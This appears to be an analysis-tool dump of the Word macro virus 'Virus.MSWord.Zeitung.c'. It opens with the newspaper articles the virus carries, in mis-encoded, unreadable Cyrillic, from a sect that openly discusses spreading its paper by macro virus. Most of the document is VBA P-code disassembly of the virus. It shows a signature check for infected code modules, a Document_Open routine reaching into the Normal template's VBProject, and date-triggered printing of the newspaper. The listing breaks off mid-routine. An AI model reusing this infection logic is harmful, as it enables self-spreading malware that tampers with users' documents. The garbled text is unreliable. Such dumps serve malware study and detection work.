'Íåñìîòðÿ íà òî, ÷òî ÿ ÿâëÿþñü àâòîðîì èäåè íàøåé ãàçåòû, ÿ õîòåëà áû íàïîìíèòü Âàì âñåì î íåîáõîäèìîñòè ñîáëþäåíèÿ ýëåìåíòàðíûõ ýòè÷åñêèõ íîðì, êîòîðûå ìû íàðóøèëè, ðàñïðîñòðàíÿÿ ãàçåòó, òàê ñêàçàòü, íàñèëüíî. Ïî-ìîåìó, ýòî íå äîëæíî ïîâûøàòü åå ðåéòèíã, à êàê ðàç íàîáîðîò. Ìíå êàæåòñÿ, ÷òî êàæäûé äîëæåí èìåòü âîçìîæíîñòü âûáèðàòü, ÷òî åìó ÷èòàòü. Íåëüçÿ ëè ñäåëàòü òàêóþ ïðîãðàììó, êîòîðàÿ ïîçâîëÿëà áû ÷èòàòåëþ ôèëüòðîâàòü èíôîðìàöèþ, äîñòàâëÿåìóþ âèðóñîì ïî òåìå. Íà âûõîä äîëæíî èäòè òîëüêî òî, ÷òî îí æåëàåò ÷èòàòü. Ìåíÿ òàêæå èíòåðåñóåò: íåëüçÿ ëè ïðåäîñòàâèòü ïîòåíöèàëüíûì ÷èòàòåëÿì âîçìîæíîñòü âûáèðàòü, ñòàíîâèòüñÿ ëè èì íåâîëüíûìè ðàñïðîñòðàíèòåëÿìè ãàçåòû èëè íåò? Íåëüçÿ ëè èì ïðè íåîáõîäèìîñòè ñòàâèòü íà ñâîèõ ìàøèíàõ êàêîé-íèáóäü óñëîâíûé çíàê äëÿ âèðóñà, êîòîðûé áóäåò áëîêèðîâàòü åãî ðàçìíîæåíèå? Ïðåäëàãàþ ïîäóìàòü íàä ýòèì.
'È åùå: êàê ó÷èòåëü ëèòåðàòóðû ÿ íà ñîáñòâåííîì îïûòå çíàþ, ÷òî â ïîñëåäíåå âðåìÿ óðîâåíü ãðàìîòíîñòè ëþäåé çàìåòíî ñíèçèëñÿ; ýòî ÿâëåíèå çàòðîíóëî è íàøó ñåêòó. ×èòàÿ ìàòåðèàëû íåêîòîðûõ íàøèõ àâòîðîâ, ïðåäíàçíà÷åííûå äëÿ ïå÷àòè, ÿ íàøëà â íèõ ìíîæåñòâî ðàçíîîáðàçíûõ îøèáîê è îïå÷àòîê. Äëÿ èõ èñïðàâëåíèÿ âî âñåõ ãàçåòàõ èìåþòñÿ êîððåêòîðû, à â íàøåé - íåò. ß ñîâåòóþ ãîñïîäèíó äèðåêòîðó ïîäóìàòü î ââåäåíèè äîëæíîñòè êîððåêòîðà.
'Ãëàâíûé ëèòåðàòóðîâåä-àíàëèòèê ñåêòû À. Í. Ãåíîâà
'Articl #11
'ÑÂÎÉ  ÂÈÐÓÑ - ÑÂÎÈÌÈ  ÐÓÊÀÌÈ.
'Ïðåæäå âñåãî, õîòåëîñü áû íàïîìíèòü âñåì, êòî çäåñü ïðèñóòñòâóåò, ÷òî âèðóñ, êîòîðûì ìû ðàñïðîñòðàíÿåì íàøó ãàçåòó, ÿâëÿåòñÿ âåñüìà îòâåòñòâåííûì èçäåëèåì: îí äîëæåí óäîâëåòâîðÿòü êó÷å ðàçíûõ òðåáîâàíèé, ïî íåìó ëþäè ñóäÿò î íàñ, î íàøåé êóëüòóðå è êîìïüþòåðíîé ãðàìîòíîñòè. Ìíå êàæåòñÿ âåñüìà ñòðàííûì, ÷òî âèðóñ ñîçäàþò ëþäè, èìåþùèå âåñüìà òóìàííîå ïðåäñòàâëåíèå î íàøåé ðàáîòå, à ðàñïðîñòðàíÿåìóþ èíôîðìàöèþ â íåãî âíîñèì ìû; ýòî ñòàëî îäíîé èç ïðè÷èí íåêîððåêòíîé ðàáîòû âèðóñà ïðè âûõîäå ïåðâîãî íîìåðà ãàçåòû, è íåèçâåñòíî, ñêîëüêî îøèáîê ýòî ìîæåò íàäåëàòü â äàëüíåéøåì. Ïîýòîìó, ÿ ñ÷èòàþ íåîáõîäèìûì ñîçäàâàòü ýòîò âèðóñ ñâîèìè ðóêàìè. Èç ñòàðîãî âèðóñà íåîáõîäèìî âçÿòü ñàìîå ëó÷øåå è âûðåçàòü ñàìîå õóäøåå, ðàçóìååòñÿ, ñ ñîáëþäåíèåì âñåõ ïðàâ åãî àâòîðîâ. Òî, ÷òî ïðåäëîæèëà ðàíåå Àííà Íèêîëàåâíà áåçóñëîâíî çàñëóæèâàåò âíèìàíèÿ, è íàä ýòèì òîæå ñëåäóåò ïîðàáîòàòü.
'Äëÿ âûïîëíåíèÿ ïîäîáíîé ðàáîòû íåîáõîäèì ïðîãðàììèñò ñ îïûòîì ñîçäàíèÿ è ðàñïðîñòðàíåíèÿ ìàêðîâèðóñîâ. Ïîðó÷àòü òàêóþ ðàáîòó ãëàâíîìó ïðîãðàììèñòó ñåêòû íåöåëåñîîáðàçíî ïî ïðè÷èíå åãî áîëüøîé çàãðóæåííîñòè, è ïîýòîìó ÿ ñ÷èòàþ íåîáõîäèìûì óêîìïëåêòîâàòü øòàò ãàçåòû òàêèì ñïåöèàëèñòîì. Â åãî îáÿçàííîñòè äîëæíî âõîäèòü ñîçäàíèå è óñîâåðøåíñòâîâàíèå âñåãî ïðîãðàììíîãî îáåñïå÷åíèÿ ãàçåòû, âêëþ÷àÿ è âèðóñ.
'Äèðåêòîð ãàçåòû Ã. Ñ.  Ëèñóíîâ
'Articl #12
'ÌÛ - ÂÀÌ, ÂÛ - ÍÀÌ.
'Êàê óæå óïîìèíàëîñü â ïåðâîì íîìåðå "Àäñêîãî îãíÿ", äëÿ íàøåé ãàçåòû îñòðî ñòîèò ïðîáëåìà îáðàòíîé ñâÿçè ñ ÷èòàòåëÿìè. Â íàñòîÿùèé ìîìåíò ìû èñïîëüçóåì ñåòü êîððåñïîíäåíòîâ, ðàñïðåäåëåííûõ ïî ãîðîäó, îäíàêî ýòîò ñïîñîá ìàëîýôôåêòèâåí, êîãäà ÷èòàòåëü èìååò íàìåðåíèå ïåðåäàòü êàêîå-ëèáî ñîîáùåíèå â ãàçåòó è âûíóæäåí èñêàòü âñòðå÷è ñ êîððåñïîíäåíòîì. Â òî æå âðåìÿ, äåëàòü êîððåñïîíäåíòîâ ëåãêî äîñòóïíûìè ìû íå ìîæåì, òàê êàê ýòî ñäåëàåò èõ óÿçâèìûìè ñî ñòîðîíû ïðàâîîõðàíèòåëüíûõ îðãàíîâ è êîíêóðèðóþùèõ ñåêò. Äëÿ ðåøåíèÿ äàííîé ïðîáëåìû áûëî âíåñåíî íåñêîëüêî ïðåäëîæåíèé, îäíàêî âñå îíè áóäóò ðåàëèçîâàíû ïîçæå, è äî òîãî ìîìåíòà ìû ïðåäëàãàåì ñâîèì ÷èòàòåëÿì ïðîñòî ïèñàòü â ðåäàêöèþ ïî àäðåñó, êîòîðûé ïðèâîäèì íèæå â çàøèôðîâàííîì âèäå. Ýòîò øèôð áûë êîãäà-òî ðàçðàáîòàí â íàøåé ñåêòå è ïðåêðàñíî çàðåêîìåíäîâàë ñåáÿ. Ê íàñòîÿùåìó âðåìåíè îí çàìåíåí áîëåå ñîâåðøåííûì, è ïîýòîìó åãî èñïîëüçîâàíèå â òàêèõ öåëÿõ íå ïðè÷èíèò íèêàêîãî óùåðáà. Ïî ìíåíèþ íàøèõ ýêñïåðòîâ òàêîé øèôð ìîãóò ðàñøèôðîâàòü òîëüêî òå ëþäè,
'êîòîðûå äåéñòâèòåëüíî æåëàþò ñâÿçàòüñÿ ñ ðåäàêöèåé. Ïèñüìà ìû ïðèíèìàåì áåç îãðàíè÷åíèé; ÷òî êàñàåòñÿ ëþäåé, êîòîðûå áóäóò ÿâëÿòüñÿ ëè÷íî, òî îíè áóäóò ïîäâåðãàòüñÿ ïðîâåðêå íà ïðèíàäëåæíîñòü ê ïðàâîîõðàíèòåëüíûì îðãàíàì, äëÿ ÷åãî ó íàñ åñòü ñïåöèàëüíàÿ ìåòîäèêà. Òåì, êîãî ìû ñî÷òåì ñîòðóäíèêàìè âûøåóïîìÿíóòûõ ó÷ðåæäåíèé, áóäóò ãîâîðèòü, ÷òî íè÷åãî ïîäîáíîãî çäåñü íåò. Ïåðâûå 10 ÷èòàòåëåé, ïðàâèëüíî ðàñøèôðîâàâøèå àäðåñ, ïîëó÷àò ïðèç â âèäå ïðàâà íà âíåî÷åðåäíóþ ïóáëèêàöèþ ñâîèõ ìàòåðèàëîâ â íàøåé ãàçåòå.
'Îñîáî ïîä÷åðêèâàþ: íåò íèêàêîé íåîáõîäèìîñòè íàçûâàòüñÿ íàñòîÿùèì èìåíåì, â íàøåé ãàçåòå Âû ìîæåòå ïóáëèêîâàòüñÿ ïîä ïñåâäîíèìîì èëè àíîíèìíî. Èòàê: àäðåñ ðåäàêöèè:
' Ìàû1  øå6ãóð îëàèçâ öì åÖçå Íä×ÒùàÈààë.åí àìèÏèðáñ èÿÿíàáå ûìâíâ ìï. îè¸ ìñ Ñí â8ñïó åðäþàìî ø ð 1åèâ7äîâà ïàêòù÷ðüèàîñî èñï.ðà
'Æåëàþ Âàì óñïåõà!
'Ãëàâíûé ðåäàêòîð Â. Ä. Òàðàñêèí
'Articl #13
'ÍÀØÈ   ÏËÀÍÛ
'Êàê ïîêàçàë àíàëèç èíòåðâüþ, âçÿòûõ ó íåêîòîðûõ íàøèõ ÷èòàòåëåé, îíè â áîëüøèíñòâå ñâîåì èíòåðåñóþòñÿ âîçìîæíîñòüþ ïîìåùàòü â íàøåé ãàçåòå ñâîè îáúÿâëåíèÿ, à íåêîòîðûå åùå è ðåêëàìó. Äëÿ ýòîãî ìû ïëàíèðóåì ââåñòè â ñâîé ñîñòàâ ñëóæáó îáúÿâëåíèé è îòäåë ðåêëàìû. Òå, êòî ñìîæåò ðàñøèôðîâàòü íàø àäðåñ, ïîëó÷èò âîçìîæíîñòü ïðèñûëàòü îáúÿâëåíèÿ. Äëÿ òåõ, êòî íå ñìîæåò ýòîãî ñäåëàòü, ìû ðàçðàáàòûâàåì ñèñòåìó îáðàòíîé ñâÿçè, îñíîâàííóþ íà ïåðåäà÷å èíôîðìàöèè ïðè ïîìîùè ìàêðîâèðóñà, ïîäîáíî òîìó, êàê ìû ïåðåïðàâëÿåì Âàì ãàçåòó. Ýòà ñèñòåìà áóäåò "äîâåäåíà äî óìà" êàê òîëüêî ó íàñ ïîÿâèòñÿ øòàòíûé ïðîãðàììèñò.
'Íè äëÿ êîãî íå ñåêðåò, ÷òî ïðèáëèæàåòñÿ 10-ëåòíèé þáèëåé ñåêòû. Ê ýòîé äàòå ìû ïëàíèðóåì ðÿä ïóáëèêàöèé, ïîñâÿùåííûõ èñòîðèè ñåêòû, åå ñîçäàíèþ è íûíåøíåé äåÿòåëüíîñòè. ß ïðèãëàøàþ âñåõ ÷ëåíîâ ñåêòû ïîìåùàòü ñâîè ïóáëèêàöèè íà ëþáóþ òåìó, ñâÿçàííóþ ñ èñòîðèåé ñåêòû.
'Äèðåêòîð ãàçåòû Ã. Ñ.  Ëèñóíîâ
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zeitung.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 42524 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x000C "VirusZeitung"
' 	VarDefn Signature
' 	QuoteRem 0x0021 0x0010 "ñèãíàòóðà âèðóñà"
' Line #1:
' 	QuoteRem 0x0000 0x0047 "èó îäë:ÀêäéÔíðâêé ëêàä ôåî  èàëØòëâ@Âðññçàè ðàè èàåñè,ÀåñíðÅðìâèÌõè ààî"
' Line #2:
' 	QuoteRem 0x0000 0x0001 "2"
' Line #3:
' 	QuoteRem 0x0000 0x0013 "íîìåð 2 çà 2000 ãîä"
' Line #4:
' 	Dim 
' 	VarDefn sd
' 	VarDefn reg (As Boolean)
' Line #5:
' 	FuncDefn (Private Function Kontaminat(O, id_FFFE As Variant))
' Line #6:
' 	Ld Signature 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld O 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #7:
' 	LitDI2 0x0000 
' 	St Kontaminat 
' Line #8:
' 	ElseBlock 
' Line #9:
' 	Ld O 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0000 
' 	St Kontaminat 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld O 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St Ant$ 
' Line #13:
' 	Ld Ant$ 
' 	LitDI2 0x0002 
' 	Ld Ant$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St Ant$ 
' Line #14:
' 	Ld Ant$ 
' 	ArgsLd Val 0x0001 
' 	LitDI4 0xFFFF 0x0000 
' 	Lt 
' 	IfBlock 
' Line #15:
' 	Ld Ant$ 
' 	ArgsLd Val 0x0001 
' 	St Kontaminat 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Kontaminat 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndFunc 
' Line #22:
' 	FuncDefn (Private Sub Document_Open())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	LitDI2 0x000C 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x000C "Àäñêèé îãîíü"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	ExitSub 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	LitVarSpecial (False)
' 	St reg 
' Line #31:
' 	LitR8 0x999A 0x9999 0x9999 0x3FA9 
' 	St p 
' Line #32:
' 	LitStr 0x0000 ""
' 	St Tag$ 
' Line #33:
' 	LitStr 0x0000 ""
' 	St Monat$ 
' Line #34:
' 	Ld Date 
' 	ArgsLd Trim 0x0001 
' 	St datum$ 
' Line #35:
' 	LitDI2 0x0001 
' 	St i 
' Line #36:
' 	Ld datum$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld i 
' 	Ld datum$ 
' 	FnLen 
' 	Lt 
' 	Paren 
' 	And 
' 	While 
' Line #37:
' 	Ld Tag$ 
' 	Ld datum$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tag$ 
' Line #38:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #39:
' 	Wend 
' Line #40:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #41:
' 	Ld datum$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld i 
' 	Ld datum$ 
' 	FnLen 
' 	Lt 
' 	Paren 
' 	And 
' 	While 
' Line #42:
' 	Ld Monat$ 
' 	Ld datum$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Monat$ 
' Line #43:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #44:
' 	Wend 
' Line #45:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St p 
' 	EndIf 
' 	QuoteRem 0x0035 0x000B " 2  ôåâðàëÿ"
' Line #46:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St p 
' 	EndIf 
' 	QuoteRem 0x0036 0x0009 " 21 ìàðòà"
' Line #47:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St p 
' 	EndIf 
' 	QuoteRem 0x0036 0x000A " 30 àïðåëÿ"
' Line #48:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St p 
' 	EndIf 
' 	QuoteRem 0x0036 0x0008 " 21 èþíÿ"
' Line #49:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St p 
' 	EndIf 
' 	QuoteRem 0x0035 0x000B " 2  àâãóñòà"
' Line #50:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St p 
' 	EndIf 
' 	QuoteRem 0x0036 0x000C " 21 ñåíòÿáðÿ"
' Line #51:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St p 
' 	EndIf 
' 	QuoteRem 0x0037 0x000B " 31 îêòÿáðÿ"
' Line #52:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St p 
' 	EndIf 
' 	QuoteRem 0x0037 0x000B " 21 äåêàáðÿ"
' Line #53:
' 	Ld Rnd 
' 	Ld p 
' 	Ge 
' 	IfBlock 
' Line #54:
' 	ExitSub 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	LitStr 0x0006 "Normal"
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #57:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #58:
' 	LitVarSpecial (False)
' 	MemLdWith LineNumbering 
' 	MemSt Active 
' Line #59:
' 	Ld wdOrientPortrait 
' 	MemStWith Orientation 
' Line #60:
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith TopMargin 
' Line #61:
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith BottomMargin 
' Line #62:
' 	LitR8 0x0000 0x0000 0x0000 0x4004 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith LeftMargin 
' Line #63:
' 	LitDI2 0x0002 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith RightMargin 
' Line #64:
' 	LitDI2 0x0000 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith Gutter 
' Line #65:
' 	LitR8 0x0000 0x0000 0x0000 0x3FF4 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith HeaderDistance 
' Line #66:
' 	LitR8 0x0000 0x0000 0x0000 0x3FF4 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith FooterDistance 
' Line #67:
' 	LitDI2 0x0015 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith PageWidth 
' Line #68:
' 	LitR8 0x3333 0x3333 0xB333 0x403D 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith PageHeight 
' Line #69:
' 	Ld wdPrinterDefaultBin 
' 	MemStWith FirstPageTray 
' Line #70:
' 	Ld wdPrinterDefaultBin 
' 	MemStWith OtherPagesTray 
' Line #71:
' 	Ld wdSectionNewPage 
' 	MemStWith SectionStart 
' Line #72:
' 	LitVarSpecial (False)
' 	MemStWith OddAndEvenPagesHeaderFooter 
' Line #73:
' 	LitVarSpecial (False)
' 	MemStWith DifferentFirstPageHeaderFooter 
' Line #74:
' 	Ld wdAlignVerticalTop 
' 	MemStWith VerticalAlignment 
' Line #75:
' 	LitVarSpecial (False)
' 	MemStWith SuppressEndnotes 
' Line #76:
' 	LitVarSpecial (False)
' 	MemStWith MirrorMargins 
' Line #77:
' 	EndWith 
' Line #78:
' 	LitStr 0x0017 "À Ä Ñ Ê È É   Î Ã Î Í Ü"
' 	LitDI2 0x0028 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (False)
' 	ArgsCall Druck_0 0x0006 
' Line #79:
' 	LitStr 0x002C "Âèðóñíàÿ ãàçåòà ñåêòû èì. Äæ. Äè è Ý. Êåëëè."
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #80:
' 	LitStr 0x0023 "Âûõîä ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà"
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #81:
' 	LitStr 0x001A "10 ìàÿ  2000  ã.   ¹ 2 (2)"
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #82:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #83:
' 	LitStr 0x0011 "Ñåãîäíÿ â íîìåðå:"
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #84:
' 	LitStr 0x0030 "* Ìíåíèÿ ÷èòàòåëåé î ãàçåòå. (Ïîäáîðêà èíòåðâüþ)"
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #85:
' 	LitStr 0x0029 "* Ïðåäëîæåíèÿ ïî óëó÷øåíèþ ðàáîòû ãàçåòû:"
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #86:
' 	LitStr 0x0020 "** Ìû ñîâåðøåíñòâóåì ñâîé âèðóñ."
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #87:
' 	LitStr 0x001A "** Íàñèëüíî ìèë íå áóäåøü."
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #88:
' 	LitStr 0x001F "** Ñâîé âèðóñ - ñâîèìè ðóêàìè. "
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #89:
' 	LitStr 0x0034 "** Ìû - âàì, âû - íàì (î ïðîáëåìàõ îáðàòíîé ñâÿçè). "
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #90:
' 	LitStr 0x000D "* Íàøè ïëàíû."
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #91:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #92:
' 	LitStr 0x001E "******************************"
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #93:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #94:
' 	LitDI2 0x0001 
' 	St vb 
' Line #95:
' 	LitDI2 0x0001 
' 	St ve 
' Line #96:
' 	LitVarSpecial (True)
' 	St reg 
' Line #97:
' 	Ld nt 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	ArgsLd Artikel_B 0x0003 
' 	St vb 
' Line #98:
' 	Ld nt 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Artikel_E 0x0002 
' 	St ve 
' Line #99:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #100:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #101:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #102:
' 	Ld ve 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #103:
' 	Ld nt 
' 	Ld ve 
' 	LitDI2 0x0002 
' 	ArgsLd Artikel_B 0x0003 
' 	St vb 
' Line #104:
' 	Ld nt 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Artikel_E 0x0002 
' 	St ve 
' Line #105:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #106:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #107:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #108:
' 	Ld ve 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (False)
' 	ArgsCall Druck_0 0x0006 
' Line #109:
' 	StartForVariable 
' 	Ld art 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x0006 
' 	For 
' Line #110:
' 	Ld nt 
' 	Ld ve 
' 	Ld art 
